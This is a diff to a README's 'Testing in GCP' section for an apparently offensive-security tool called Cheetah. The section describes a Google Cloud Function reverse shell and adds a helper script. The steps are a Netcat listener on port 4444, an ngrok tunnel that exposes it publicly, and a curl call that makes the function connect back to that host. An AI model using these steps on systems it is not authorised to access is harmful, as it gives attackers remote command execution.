@@ -50,19 +50,25 @@ gcloud beta secrets add-iam-policy-binding cheetah-database-user --member servic
 
 ## Testing in GCP
 
-Set up a TCP listener for your reverse shell, such as with [Netcat](http://netcat.sourceforge.net/):
+If you have [Netcat](http://netcat.sourceforge.net/) and [ngrok](https://ngrok.com/) installed, you can use this script:
+
+```bash
+script/cheetah --url-id YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID
+```
+
+Alternatively, you can do this manually by setting up a Netcat listener like so:
 
 ```bash
 nc -l 4444
 ```
 
-To make your listener accessible from the public internet, consider using a service like [ngrok](https://ngrok.com/):
+Then, to make your listener accessible from the public internet, consider using a service like [ngrok](https://ngrok.com/):
 
 ```bash
 ngrok tcp 4444
 ```
 
-Invoke your function, supplying your connection details:
+Finally, invoke your function, supplying your connection details:
 
 ```bash
 curl 'http://us-central1-YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID.cloudfunctions.net/Cheetah?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER'
